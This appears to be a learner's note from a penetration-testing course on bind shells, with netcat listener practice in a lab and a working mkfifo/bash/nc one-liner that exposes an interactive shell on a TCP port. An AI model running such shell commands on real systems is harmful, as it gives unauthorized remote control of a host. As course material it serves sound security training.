Main goal here is to establish a shell on a local or remote system. We will be looking to use the terminal emulator app on our local attack box to control the remote system. This is typically done by a reverse or bind shell.

Bind Shell Example:

- The target has a listener started and awaits a connection from the attackers machine.
    - Target Machine nc -lvnp 1337
        - This establishes a listener on our target machine on port 1337
- Challenges may include:
    - Having a listener already no the target machine.
    - If no listener, we would have to find a way to get one started.
    - Admins typically configure strict incoming firewall rules and NAT on the edge of the network, so we would need internal access already.
    - Operating system firewall would likely block most incoming connections that aren’t associated with trusted network-based applications.

**Practicing with Netcat:**

First, let’s start the listener on the target:

```bash
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
```

Next, Let’s establish the connection from our Attacking Box:

```bash
realCustampin@htb[/htb]$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

We can then see on the target that we get a connection in return:

```bash
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!
```

Now, we can send a message from the Attack Box to the Target:

```bash
realCustampin@htb[/htb]$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy
```

- We type out the message “Hello Academy” after we connect.

We can then see that message on our target host:

```bash
Victim@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy
```

**Creating a Real Bind Shell**

1. Binding a Bash Shell to the TCP Session: 1.
    
    `Target@server:~**$** rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i **2**>**&1** | nc -l 10.129.41.200 7777 > /tmp/f`
    
2. Connecting to the bind shell on the target: 1.
    
    ```bash
    realCustampin@htb[/htb]$ nc -nv 10.129.41.200 7777
    
    Target@server:~$
    ```
    
3. Notice that we now have an interactive bind shell to the target host.
    

Reminder: We had access to both resources, which isn’t typical.